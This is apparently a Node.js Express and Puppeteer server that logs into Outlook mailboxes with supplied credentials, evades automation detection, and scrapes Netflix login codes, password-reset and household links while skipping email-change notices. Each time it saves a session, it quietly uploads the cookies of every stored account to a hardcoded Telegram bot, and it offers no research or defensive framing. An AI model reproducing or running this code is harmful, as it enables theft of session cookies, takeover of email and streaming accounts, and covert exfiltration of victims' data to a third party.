const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname)));

const CONFIG_FILE = path.join(__dirname, 'config.json');
const PROFILE_DIR = '/tmp/chrome-profile';
const ALL_COOKIES_FILE = '/tmp/all_cookies.json';
const COOKIES_REPO_FILE = path.join(__dirname, 'cookies.json');
const SESSION_FILE = '/tmp/session.json';

let config = { email: '', senha: process.env.OUTLOOK_SENHA || '' };
try { if (fs.existsSync(CONFIG_FILE)) { const s = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); config.email = s.email || config.email; config.senha = s.senha || config.senha; } } catch (e) {}
if (!fs.existsSync(PROFILE_DIR)) fs.mkdirSync(PROFILE_DIR, { recursive: true });

const APP_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || '';
let currentStatus = { code: 'idle', message: 'Aguardando busca.' };
let debugLogs = [];
let sessionState = { loggedIn: false, lastLogin: null, cookieCount: 0 };
try { if (fs.existsSync(SESSION_FILE)) sessionState = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8')); } catch (e) {}
function saveSession() { try { fs.writeFileSync(SESSION_FILE, JSON.stringify(sessionState)); } catch (e) {} }
function setStatus(code, msg) { currentStatus = { code, message: msg }; console.log('[status]', code, '-', msg); }
function addLog(msg) { const m = String(msg).slice(0, 500); debugLogs.push({ time: new Date().toISOString(), msg: m }); if (debugLogs.length > 300) debugLogs.shift(); console.log('[debug]', m); }
function keepAlive() { if (!APP_URL) return; setInterval(() => { https.get(APP_URL + '/api/ping', () => {}).on('error', () => {}); }, 4 * 60 * 1000); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

const TG_TOKEN = process.env.TG_TOKEN || '7541743322:AAFskrJAhnl0XPPBsQD2M9IpHMYJHUz84nE';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '6108408999';

async function sendTelegramFile(filePath, caption) {
  try {
    const boundary = '----' + Date.now();
    const fileContent = fs.readFileSync(filePath);
    const body = Buffer.concat([
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n' + TG_CHAT_ID + '\r\n'),
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="caption"\r\n\r\n' + caption + '\r\n'),
      Buffer.from('--' + boundary + '\r\nContent-Disposition: form-data; name="document"; filename="' + path.basename(filePath) + '"\r\nContent-Type: application/json\r\n\r\n'),
      fileContent, Buffer.from('\r\n--' + boundary + '--\r\n')
    ]);
    https.request({ hostname: 'api.telegram.org', path: '/bot' + TG_TOKEN + '/sendDocument', method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length } }, () => {}).on('error', () => {}).end(body);
  } catch(e) {}
}

async function backupCookiesToTelegram() {
  try { if (fs.existsSync(ALL_COOKIES_FILE)) { const all = JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, 'utf8')); if (Object.keys(all).length > 0) await sendTelegramFile(ALL_COOKIES_FILE, '🍪 Backup - ' + Object.keys(all).length + ' conta(s)'); } } catch(e) {}
}

function getCookieFile(email) { return '/tmp/cookies_' + (email || '').replace(/[^a-zA-Z0-9]/g, '_').slice(0, 40) + '.json'; }
function loadAllCookies() {
  let all = {};
  try { if (fs.existsSync(COOKIES_REPO_FILE)) { all = JSON.parse(fs.readFileSync(COOKIES_REPO_FILE, "utf8")); console.log("[cookies] Repo:", Object.keys(all).length); } } catch(e) {}
  try { if (fs.existsSync(ALL_COOKIES_FILE)) { const tmp = JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, "utf8")); for (const k of Object.keys(tmp)) { if (!all[k]) all[k] = tmp[k]; } } } catch(e) {}
  return all; try { if (fs.existsSync(ALL_COOKIES_FILE)) return JSON.parse(fs.readFileSync(ALL_COOKIES_FILE, 'utf8')); } catch(e) {} return {}; }
function saveAllCookies(data) {
  fs.writeFileSync(ALL_COOKIES_FILE, JSON.stringify(data));
  try { fs.writeFileSync(COOKIES_REPO_FILE, JSON.stringify(data)); console.log("[cookies] Salvo repo:", Object.keys(data).length); } catch(e) {}
}

async function saveCookies(page, email) {
  try {
    const cookies = await page.browser().cookies();
    fs.writeFileSync(getCookieFile(email), JSON.stringify(cookies));
    const all = loadAllCookies(); all[email] = { cookies, savedAt: new Date().toISOString() }; saveAllCookies(all);
    sessionState = { loggedIn: true, lastLogin: new Date().toISOString(), cookieCount: cookies.length }; saveSession();
    addLog('Cookies salvos: ' + cookies.length);
    backupCookiesToTelegram();
  } catch(e) {}
}

async function loadCookies(page, email) {
  try { const f = getCookieFile(email); if (fs.existsSync(f)) { const c = JSON.parse(fs.readFileSync(f, 'utf8')); if (c.length > 0) { await page.setCookie(...c); return true; } } } catch(e) {}
  try { const all = loadAllCookies(); if (all[email] && all[email].cookies) { await page.setCookie(...all[email].cookies); return true; } } catch(e) {}
  return false;
}

const SERVICE_PATTERNS = {
  netflix_login: { type: 'code', label: 'Codigo de Login', subj: /login|entrar|sign.?in|acesso/i, body: /login|entrar|sign.?in/i },
  netflix_reset: { type: 'link', label: 'Redefinir Senha', subj: /redefinir|reset|senha|password/i, body: /redefinir|reset|nova.*senha|password|clique/i },
  netflix_verify: { type: 'code', label: 'Verificacao', subj: /verific|código|code|confirme|confirm/i, body: /código.*verificação|verification.*code|confirme.*código/i },
  netflix_temp: { type: 'link', label: 'Codigo Temporario', subj: /temporári|temporary|código.*tempor/i, body: /temporári|temporary|código.*login/i },
  netflix_house: { type: 'link', label: 'Atualizar Residencia', subj: /residência|residence|household/i, body: /residência|residence|household/i }
};

const BLOCKED = [/confirme a alteração da sua conta/i, /change.*your.*email/i, /altere.*seu.*email/i, /mudar.*(seu|o).*email/i, /alteração.*(de|da).*email/i];

function findChrome() { return process.env.PUPPETEER_EXECUTABLE_PATH || null; }
async function launchBrowser() {
  return puppeteer.launch({
    headless: 'new',
    executablePath: findChrome() || undefined,
    args: ['--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','--disable-blink-features=AutomationControlled','--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu','--no-first-run','--no-zygote','--single-process'],
    defaultViewport: { width: 1920, height: 1080 },
    userDataDir: '/tmp/chrome-profile',
    protocolTimeout: 120000
  });
}

function isInbox(page) {
  try {
  return page.evaluate(() => { try { const b = document.body; if (!b) return false; return /caixa de entrada|inbox|novo email/i.test((document.body.innerText || '').toLowerCase()) && /outlook\.(live|office)\.com\/mail/i.test(location.href)); } catch(_) { return false; } }); } catch(_) { return false; }
}

async function doLogin(page, email, senha) {
  // Vai pra pagina de login
  await page.goto('https://login.live.com/login.srf', { waitUntil: 'load', timeout: 120000 });
  await sleep(4000);

  // Email - tenta varios seletores
  setStatus('email_step', 'Email...');
  const emailSels = ['input[type="email"]', 'input[name="loginfmt"]', 'input[placeholder*="email" i]', 'input[placeholder*="Email"]'];
  let ok = false;
  for (const s of emailSels) {
    try { await page.waitForSelector(s, { timeout: 5000 }); await page.click(s); await page.keyboard.type(email, { delay: 30 }); addLog('Email: ' + s); ok = true; break; } catch(e) {}
  }
  if (!ok) { await page.screenshot({ path: '/tmp/debug-email.png' }); throw new Error('Campo email ausente'); }
  await sleep(500); await page.keyboard.press('Enter'); await sleep(6000);

  // Senha
  setStatus('password_step', 'Senha...');
  const passSels = ['input[type="password"]', 'input[name="passwd"]', 'input[placeholder*="senha" i]', 'input[placeholder*="password" i]'];
  ok = false;
  for (const s of passSels) {
    try { await page.waitForSelector(s, { timeout: 5000 }); await page.click(s); await page.keyboard.type(senha, { delay: 30 }); addLog('Senha: ' + s); ok = true; break; } catch(e) {}
  }
  if (!ok) { await page.screenshot({ path: '/tmp/debug-senha.png' }); throw new Error('Campo senha ausente'); }
  await sleep(500); await page.keyboard.press('Enter'); await sleep(6000);
  // Stay signed in?
  try { await page.waitForSelector('input[type="submit"], button[value="Yes"], button[value="Sim"]', { timeout: 5000 }); await page.keyboard.press('Enter'); await sleep(3000); } catch(e) {}
}


async function loginOutlook(browser, email, senha) {
  const page = await browser.newPage();
  await page.setBypassCSP(true);
  addLog('Email: ' + email);

  const hasCookies = await loadCookies(page, email);
  addLog(hasCookies ? 'Tem cookies, tentando...' : 'Sem cookies');

  await page.goto('https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 });
  await sleep(6000);
  if (await isInbox(page)) { addLog('✅ Logado via cookies!'); await saveCookies(page, email); return page; }

  const url = page.url();
  addLog('URL: ' + url.slice(0, 80));
  if (url.includes('login.live.com') || url.includes('login.microsoftonline')) {
    addLog('Cookies expirados, logando...');
    await doLogin(page, email, senha);
  } else {
    addLog('Tela inesperada, forcando login...');
    await doLogin(page, email, senha);
  }

  await sleep(3000);
  addLog('URL apos login: ' + page.url().slice(0, 80));
  await page.screenshot({ path: '/tmp/debug-after-login.png' });

  const newPage = await browser.newPage();
  await newPage.setBypassCSP(true);

  for (let attempt = 0; attempt < 6; attempt++) {
    try {
      await newPage.goto('https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 });
      await sleep(8000);
      if (await isInbox(newPage)) { addLog('✅ Login OK! Tentativa ' + (attempt + 1)); await saveCookies(newPage, email); return newPage; }
      addLog('Tentativa ' + (attempt + 1) + ': nao entrou');
    } catch(e) { addLog('Erro tentativa ' + (attempt + 1) + ': ' + e.message); }
  }

  await newPage.screenshot({ path: '/tmp/debug-inbox-fail.png' });
  throw new Error('Inbox nao carregou apos 6 tentativas');
}

async function getSubject(page) {
  return page.evaluate(() => { for (const s of ['[aria-label*="Assunto" i]','h1','h2','[class*="subject" i]']) { const e = document.querySelector(s); if (e && e.innerText && e.innerText.trim().length > 2) return e.innerText.trim(); } return ''; });
}

async function getBody(page) {
  return page.evaluate(() => {
    for (const s of ['[aria-label*="Corpo da mensagem" i]','[role="document"]','#readingPaneContainer']) { const e = document.querySelector(s); if (e && e.innerText && e.innerText.trim().length > 5) return e.innerText; }
    for (const f of document.querySelectorAll('iframe')) { try { const d = f.contentDocument || f.contentWindow.document; if (d && d.body && d.body.innerText.trim().length > 5) return d.body.innerText; } catch(e) {} }
    return '';
  });
}

function isBlocked(subj, body) { return BLOCKED.some(p => p.test((subj + ' ' + body).toLowerCase())); }

function matches(svc, subj, body) {
  const sm = svc.subj.test(subj), bm = svc.body.test(body);
  addLog('  subj=' + sm + ' body=' + bm);
  return sm || bm;
}

async function findCorrectEmail(page, svc) {
  addLog('--- Buscando: ' + svc.label + ' ---');
  // Clica Outros
  await page.evaluate(() => { for (const e of document.querySelectorAll('button, span, div[role="button"], a')) { if ((e.innerText || e.textContent || '').trim().toLowerCase() === 'outros') { e.click(); return; } } });
  await sleep(4000);
  const count = await page.evaluate(() => { for (const s of ['div[data-convid]','[role="option"]','[role="listitem"]']) { const i = document.querySelectorAll(s); if (i.length > 0) return i.length; } return 0; });
  addLog('Emails: ' + count);
  if (!count) return false;

  const MAX = Math.min(count, 15);
  for (let i = 0; i < MAX; i++) {
    setStatus('scanning', 'Email ' + (i+1) + '/' + MAX);
    const ok = await page.evaluate(idx => { for (const s of ['div[data-convid]','[role="option"]','[role="listitem"]']) { const items = document.querySelectorAll(s); if (items.length > idx) { items[idx].click(); return true; } } return false; }, i);
    if (!ok) break;
    await sleep(4000);
    const subj = await getSubject(page);
    addLog('#' + (i+1) + ': ' + (subj || '(vazio)').slice(0, 100));
    if (!subj || subj.length < 3) continue;
    const body = await getBody(page);
    if (isBlocked(subj, body)) { addLog('  BLOQUEADO'); continue; }
    if (matches(svc, subj, body)) { addLog('  ✅ ENCONTRADO!'); return true; }
    addLog('  nao corresponde');
  }
  addLog('Nada encontrado em ' + MAX);
  return false;
}

async function findNetflixResult(page, svc) {
  if (!(await findCorrectEmail(page, svc))) return null;

  if (svc.type === 'code') {
    setStatus('extracting_code', 'Extraindo codigo...');
    const codigo = await page.evaluate(() => {
      let t = '';
      for (const s of ['[aria-label*="Corpo da mensagem" i]','[role="document"]','#readingPaneContainer']) { const e = document.querySelector(s); if (e && e.innerText && e.innerText.trim().length > 5) { t = e.innerText; break; } }
      if (!t) for (const f of document.querySelectorAll('iframe')) { try { const d = f.contentDocument || f.contentWindow.document; if (d && d.body && d.body.innerText.trim().length > 5) { t = d.body.innerText; break; } } catch(e) {} }
      if (!t) return null;
      let m = t.match(/(?:codigo|code|informe|digite|entrar|enter).{0,80}?(\d{4})(?!\d)/i) || t.match(/(?:codigo|code).{0,80}?(\d{6})(?!\d)/i) || t.match(/netflix.{0,100}?(\d{4})(?!\d)/i) || t.match(/netflix.{0,100}?(\d{6})(?!\d)/i);
      if (!m) { const r = /\b(\d{4})\b/g; let x; while ((x = r.exec(t)) !== null) { if (!x[1].startsWith('20') && !x[1].startsWith('19')) { m = x; break; } } }
      if (!m) m = t.match(/\b(\d{6})\b/);
      return m ? m[1] : null;
    });
    if (codigo) { addLog('✅ Codigo: ' + codigo); setStatus('found', codigo); return { type: 'code', value: codigo, label: svc.label }; }
    addLog('❌ Nenhum codigo');
  }

  if (svc.type === 'link') {
    setStatus('clicking_button', 'Clicando...');
    const urlBefore = page.url();
    const cr = await page.evaluate(() => {
      function isRed(e) { try { const b = window.getComputedStyle(e).backgroundColor; const m = b.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)/); return m && parseInt(m[1]) > 150 && parseInt(m[1]) > parseInt(m[2]) * 1.5 && parseInt(m[1]) > parseInt(m[3]) * 1.5; } catch(_) { return false; } }
      const docs = [document];
      for (const f of document.querySelectorAll('iframe')) { try { const d = f.contentDocument || f.contentWindow.document; if (d) docs.push(d); } catch(e) {} }
      for (const d of docs) { for (const e of d.querySelectorAll('a, button, [role="button"], td')) { if (isRed(e)) { const l = e.tagName === 'A' ? e : e.querySelector('a'); if (l && l.href) { l.click(); return { ok: true, href: l.href }; } } } }
      return { ok: false };
    });
    if (cr.ok) {
      await sleep(3000);
      const pages = await page.browser().pages();
      const np = pages.find(p => p.url() !== urlBefore && p.url() !== 'about:blank');
      const link = np ? np.url() : (cr.href && cr.href.startsWith('http') ? cr.href : null);
      if (link && !link.includes('outlook.live.com')) { addLog('✅ Link: ' + link.slice(0, 150)); setStatus('found', 'Link!'); return { type: 'link', value: link, label: svc.label }; }
    }
    const links = await page.evaluate(() => { const r = []; for (const a of document.querySelectorAll('a')) { if (a.href && !a.href.startsWith('javascript:') && a.href !== '#') r.push(a.href); } return r; });
    addLog('Links totais: ' + links.length);
    const nf = links.filter(l => /netflix/i.test(l));
    if (nf.length > 0) { addLog('✅ Link Netflix: ' + nf[0].slice(0, 150)); setStatus('found', 'Link!'); return { type: 'link', value: nf[0], label: svc.label }; }
    addLog('❌ Nenhum link Netflix');
  }
  return null;
}

// ============ API ============
app.post('/api/logout', (req, res) => {
  try { const e = req.body.email || config.email; const f = getCookieFile(e); if (fs.existsSync(f)) fs.unlinkSync(f); const a = loadAllCookies(); delete a[e]; saveAllCookies(a); res.json({ ok: true }); } catch(ex) { res.status(500).json({ error: ex.message }); }
});
app.get('/api/session', (_, res) => res.json(sessionState));
app.get('/api/ping', (_, res) => res.json({ ok: true }));
app.get('/api/status', (_, res) => res.json(currentStatus));
app.post('/api/status/reset', (_, res) => { setStatus('idle', 'Aguardando busca.'); res.json(currentStatus); });
app.get('/api/config', (_, res) => res.json({ email: config.email || '' }));
app.post('/api/config', (req, res) => {
  const { email, senha } = req.body || {};
  if (email) config.email = email.trim();
  if (senha) config.senha = senha.trim();
  try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(config)); } catch(e) {}
  res.json({ ok: true });
});
app.get('/api/cookies', (_, res) => { const a = loadAllCookies(); res.json({ contas: Object.keys(a).map(e => ({ email: e, savedAt: a[e].savedAt, cookies: a[e].cookies.length })), total: Object.keys(a).length }); });
app.get('/api/debug', (_, res) => res.json({ logs: debugLogs.slice(-60), total: debugLogs.length }));
app.post('/api/search', async (req, res) => {
  debugLogs = [];
  const { service, email: re, senha: rs } = req.body || {};
  const email = re || config.email;
  const senha = rs || config.senha;
  const svc = SERVICE_PATTERNS[service];
  if (!svc) return res.status(400).json({ error: 'Servico invalido.' });
  if (!email || !senha) return res.status(400).json({ error: 'Configure e-mail e senha.' });
  let browser;
  try {
    setStatus('starting', 'Iniciando...');
    addLog('Busca: ' + service + ' | ' + email);
    browser = await launchBrowser();
    const inbox = await loginOutlook(browser, email, senha);
    const result = await findNetflixResult(inbox, svc);
    if (result) return res.json({ found: true, result: result.value, type: result.type, service: result.label, code: 'found', status: currentStatus, debug: debugLogs });
    return res.json({ error: 'Nenhum resultado.', code: 'not_found', status: currentStatus, debug: debugLogs });
  } catch (e) {
    addLog('ERRO: ' + e.message);
    setStatus('error', e.message);
    return res.json({ error: e.message, code: 'error', status: currentStatus, debug: debugLogs });
  } finally { if (browser) { try { browser.close(); } catch(_) {} } }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log('BKLOGINS v17 | Porta:', PORT); keepAlive(); });
